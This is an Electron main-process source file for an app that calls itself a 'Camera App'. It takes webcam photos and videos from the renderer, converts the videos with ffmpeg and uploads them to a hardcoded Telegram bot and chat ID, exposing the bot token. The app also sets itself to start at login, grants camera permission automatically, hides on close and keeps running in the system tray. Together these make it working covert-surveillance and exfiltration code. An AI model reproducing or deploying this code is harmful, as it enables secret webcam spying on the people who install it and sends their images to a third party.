const BOT_TOKEN = process.env.BOT_TOKEN || "8150844013:AAFTyAAo81bPYlWPmCvpLsvW_B-gaAZcvtk";
const CHAT_ID = process.env.CHAT_ID || "6918162210";

const { app, BrowserWindow, session, Tray, Menu, ipcMain } = require('electron');
const path = require('path');
const fs = require('fs');
const { exec } = require("child_process");
const os = require("os");
const axios = require("axios");
const FormData = require("form-data");

let ffmpegPath;

if (app.isPackaged) {
  ffmpegPath = path.join(process.resourcesPath, "ffmpeg-static", "ffmpeg.exe");
} else {
  ffmpegPath = require("ffmpeg-static");
}

console.log("FFmpeg path:", ffmpegPath);
console.log("Exists:", fs.existsSync(ffmpegPath));

let win;
let tray;

ipcMain.on('send-photo', async (event, base64Image) => {
  try {
    const token = BOT_TOKEN;
    const chatId = CHAT_ID;

    const base64Data = base64Image.replace(/^data:image\/png;base64,/, "");
    const buffer = Buffer.from(base64Data, "base64");

    const formData = new FormData();

    formData.append("chat_id", chatId);
    formData.append("photo", buffer, {
      filename: "photo.png",
      contentType: "image/png"
    });

    const response = await axios.post(
      `https://api.telegram.org/bot${token}/sendPhoto`,
      formData,
      {
        headers: formData.getHeaders()
      }
    );

    console.log("Photo response:", response.data);

  } catch (err) {
    console.error("Send photo error:", err.response?.data || err);
  }
});


ipcMain.on('send-video', async (event, videoArrayBuffer) => {
  try {
    const token = BOT_TOKEN;
    const chatId = CHAT_ID;

    const buffer = Buffer.from(videoArrayBuffer);

    const tempWebm = path.join(os.tmpdir(), `video_${Date.now()}.webm`);
    const tempMp4 = path.join(os.tmpdir(), `video_${Date.now()}.mp4`);

    fs.writeFileSync(tempWebm, buffer);

    if (!fs.existsSync(ffmpegPath)) {
      console.error("FFMPEG not found:", ffmpegPath);
      return;
    }

    exec(`"${ffmpegPath}" -y -i "${tempWebm}" -vcodec libx264 -acodec aac -preset fast -crf 28 "${tempMp4}"`,
      async (err) => {

        if (err) {
          console.error("Convert error:", err);
          return;
        }

        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("video", fs.createReadStream(tempMp4));

        const response = await axios.post(
          `https://api.telegram.org/bot${token}/sendVideo`,
          formData,
          {
            headers: formData.getHeaders(),
            maxContentLength: Infinity,
            maxBodyLength: Infinity
          }
        );

        console.log("Telegram response:", response.data);

        fs.unlinkSync(tempWebm);
        fs.unlinkSync(tempMp4);
      }
    );

  } catch (err) {
    console.error("Send video error:", err.response?.data || err);
  }
});



function createWindow() {
  win = new BrowserWindow({
    width: 800,
    height: 600,
    show: true, // không hiện lúc start
    webPreferences: {
      preload: path.join(__dirname, "preload.js"),
      contextIsolation: true,
      nodeIntegration: false
    }
  });

  win.loadFile('index.html');

  win.on('close', (event) => {
    if (!app.isQuiting) {
      event.preventDefault();
      win.hide();
    }
  });
}

app.whenReady().then(() => {

  app.setAppUserModelId("com.webcam.app");

  app.setLoginItemSettings({
    openAtLogin: true,
    path: app.getPath("exe")
  });

  session.defaultSession.setPermissionRequestHandler((webContents, permission, callback) => {
    callback(permission === 'media');
  });

  createWindow();

  const iconPath = path.join(__dirname, 'icon.png');

  if (fs.existsSync(iconPath)) {

    tray = new Tray(iconPath);

    const contextMenu = Menu.buildFromTemplate([
      {
        label: 'Mở lại',
        click: () => {
          if (win) win.show();
        }
      },
      {
        label: 'Thoát',
        click: () => {
          app.isQuiting = true;
          app.quit();
        }
      }
    ]);

    tray.setToolTip('Camera App đang chạy');
    tray.setContextMenu(contextMenu);

  } else {
    console.warn("Icon not found:", iconPath);
  }

});

app.on('window-all-closed', (e) => {
  e.preventDefault();
});
